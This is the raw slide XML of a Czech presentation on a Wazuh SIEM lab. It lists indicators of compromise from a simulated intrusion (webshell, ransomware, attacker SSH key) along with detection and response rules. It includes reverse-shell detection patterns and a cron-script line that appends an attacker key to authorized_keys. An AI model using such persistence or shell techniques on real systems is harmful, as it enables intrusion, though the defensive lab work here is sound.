            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF444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4900" y="2404872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</a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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shell (PHP)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6437376" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF444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1581912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</a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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klíč → root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7420356" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF444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80860" y="2404872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</a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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Exfiltrace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8403336" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF444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0" y="1581912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</a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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548640" y="3154680"/>
            <a:ext cx="8046720" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B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2960" y="32918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KLÍČOVÉ INDIKÁTORY KOMPROMITACE (IoC)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" y="3657600"/>
            <a:ext cx="2286000" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9091"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354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36576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útočníka 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192.168.122.224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29000" y="3657600"/>
            <a:ext cx="2286000" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9091"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3566160" y="36576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Porty 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9002 · 8000 · 4444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35040" y="3657600"/>
            <a:ext cx="2286000" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9091"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="36576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Webshell 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webshell.jpg.php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22960" y="4325112"/>
            <a:ext cx="2286000" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9091"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="432511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ransomware.py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429000" y="4325112"/>
            <a:ext cx="2286000" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9091"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3566160" y="432511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Přípona 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.vspjlock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035040" y="4325112"/>
            <a:ext cx="2286000" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9091"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="432511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ssh-ed25519 klíč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280160"/>
            <a:ext cx="4206240" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45"/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2926080"/>
            <a:ext cx="2743200" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354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554480"/>
            <a:ext cx="914400" cy="9144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17922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640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874520" y="17007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TŘETÍ ČÁST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847088" y="19659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Ochranná opatření a hardening</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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OCHRANNÁ OPATŘENÍ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Detekční pravidla a reakce z nalezených IoC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15184" cy="315468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746504"/>
            <a:ext cx="603504" cy="603504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007" y="1903415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2459736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Blokace známé IP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68096" y="2990088"/>
            <a:ext cx="2203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Response s firewall-drop přidá pravidlem 100100 škodlivou IP do iptables. Komunikace ze zdroje z blacklistu je zahazována.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68096" y="4151376"/>
            <a:ext cx="2176272" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F8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4151376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100100 · firewall-drop</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="930" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="1508760"/>
            <a:ext cx="2615184" cy="315468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83864" y="1746504"/>
            <a:ext cx="603504" cy="603504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775" y="1903415"/>
            <a:ext cx="289682" cy="28968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83864" y="2459736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Odstranění známého malware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483864" y="2990088"/>
            <a:ext cx="2203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 webshellu a ransomwaru v CDB databázi. FIM detekuje shodu (rule 99901) a AR spustí remove-threat.sh.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483864" y="4151376"/>
            <a:ext cx="2176272" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3538728" y="4151376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 hash · remove-threat.sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="930" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5980176" y="1508760"/>
            <a:ext cx="2615184" cy="315468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99632" y="1746504"/>
            <a:ext cx="603504" cy="603504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6543" y="1903415"/>
            <a:ext cx="289682" cy="28968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99632" y="2459736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Detekce reverse shellu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199632" y="2990088"/>
            <a:ext cx="2203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Auditd sleduje execve; pravidla hledají vzorce (bash &lt;&amp;3, nc -c, telnet://). AR proces ukončí (rule 100202).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199632" y="4151376"/>
            <a:ext cx="2176272" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="4151376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auditd + Suricata · kill-revshell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="930" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="475488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Sdílení IoC v bezpečnostní komunitě umožnilo připravit obranu v předstihu. Limitace: modifikací kódu se mění hash — proti polymorfnímu malwaru je nutná i integrace s VirusTotal.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OCHRANNÁ OPATŘENÍ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Self-healing souboru authorized_keys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938528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43584" y="1664208"/>
            <a:ext cx="548640" cy="548640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6230" y="1806854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26771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Detekce (FIM)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76656" y="2542032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Pravidlo 550 — změna kontrolního součtu sledovaného souboru.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="960" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2505456" y="1938528"/>
            <a:ext cx="128016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651760" y="1481328"/>
            <a:ext cx="1938528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46704" y="1664208"/>
            <a:ext cx="548640" cy="548640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9350" y="1806854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51760" y="226771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Response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779776" y="2542032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Spuštění skriptu restore-key.sh lokálně na agentovi.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="960" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4608576" y="1938528"/>
            <a:ext cx="128016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4754880" y="1481328"/>
            <a:ext cx="1938528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49824" y="1664208"/>
            <a:ext cx="548640" cy="548640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2470" y="1806854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54880" y="226771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Obnova ze zálohy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882896" y="2542032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Nahrazení validní kopií, oprava vlastníka a práv (600).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="960" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6711696" y="1938528"/>
            <a:ext cx="128016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6858000" y="1481328"/>
            <a:ext cx="1938528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552944" y="1664208"/>
            <a:ext cx="548640" cy="548640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5590" y="1806854"/>
            <a:ext cx="263347" cy="26334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58000" y="226771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Ohlášení v SIEM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6986016" y="2542032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Pravidlo 100300 vizualizuje úspěšnou obnovu analytikovi.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="960" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3493008"/>
            <a:ext cx="8046720" cy="1207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B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777240" y="35844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restore-key.sh  (Active Response, location: local)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777240" y="3858768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FILE_PATH=$(echo "$ALERT_JSON" | jq -r '.parameters.alert.syscheck.path')
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[[ $FILE_PATH == ".ssh/authorized_keys" ]]; then
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cp /var/ossec/.ssh/joe-keys/authorized_keys /home/joe/.ssh/authorized_keys
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chown joe: …  &amp;&amp;  chmod 600 …  &amp;&amp;  log "AR: authorized_keys restored"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OCHRANNÁ OPATŘENÍ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Forenzní analýza ze zjištěných IoC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ODHALILA REKONSTRUKCE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00784"/>
            <a:ext cx="416052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965960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987552" y="17830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Centrální logy přežily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87552" y="204825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po smazání lokálních žurnálů na oběti zůstaly události uložené na manageru.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416052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734056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987552" y="255117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Opakovaná změna klíče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87552" y="281635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Pravidelná modifikace authorized_keys v intervalech → automatizovaný mechanismus (cron).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236976"/>
            <a:ext cx="416052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502152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987552" y="331927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Zneužitý cron skript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87552" y="358444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crontab uživatele joe spouštěl /opt/utils/backup.sh každou minutu.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005072"/>
            <a:ext cx="416052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3232" y="427024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987552" y="408736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World-writable oprávnění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87552" y="435254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Skript šel zapsat libovolným uživatelem — útočník do něj vložil zápis klíče.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1481328"/>
            <a:ext cx="3749040" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2353"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B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0" y="160934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root@ubuntu-server-1: crontab -u joe -l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0" y="1901952"/>
            <a:ext cx="3429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#Ansible: Run backup every minute
</a:t>
            </a:r>
            <a:pPr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* * * * /opt/utils/backup.sh
</a:t>
            </a:r>
            <a:pPr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cat /opt/utils/backup.sh
</a:t>
            </a:r>
            <a:pPr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 -cvf …/documents.bac.tar …
</a:t>
            </a:r>
            <a:pPr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"ssh-ed25519 AAAAC3…kali@kali"
</a:t>
            </a:r>
            <a:pPr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&gt;&gt; /home/joe/.ssh/authorized_keys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4846320" y="3950208"/>
            <a:ext cx="3749040" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7317"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F8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3950208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Závěr: integritu je nutné kontrolovat nejen u cílových souborů, ale i u skriptů, které s nimi manipulují.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371600"/>
            <a:ext cx="4206240" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45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108960"/>
            <a:ext cx="3108960" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45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70500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81328" y="548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Závěr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3931920" cy="3154680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2319"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45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737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se potvrdilo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1248" y="224028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Detekce brute force a agresivních skenů (Wazuh + Suricata)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="130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Záchyt uploadu webshellu, hash detekce a smazání přes AR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="130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Vrstvená obrana zastavila několik fází útoku v reálném čase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508760"/>
            <a:ext cx="3931920" cy="3154680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2319"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45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1737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Limitace a budoucí rozvoj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956048" y="224028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Modifikovaný kód mění hash → striktnější FIM + VirusTotal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="130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Méně invazivní skeny vyžadují vlastní signatury Suricata</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="3429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Honeypoty, vlastní dekodéry a strojové učení nad logy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47731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Funkční open-source SIEM laboratoř ověřila Wazuh jako kompetentní nástroj pro detekci incidentů i preventivní hardening.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Využití platformy Wazuh pro SIEM ve virtuálním prostředí</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Zdeněk Frydrýn</dc:creator>
  <cp:lastModifiedBy>Zdeněk Frydrýn</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-06-10T19:57:32Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-10T19:57:32Z</dcterms:modified>
</cp:coreProperties>
</file>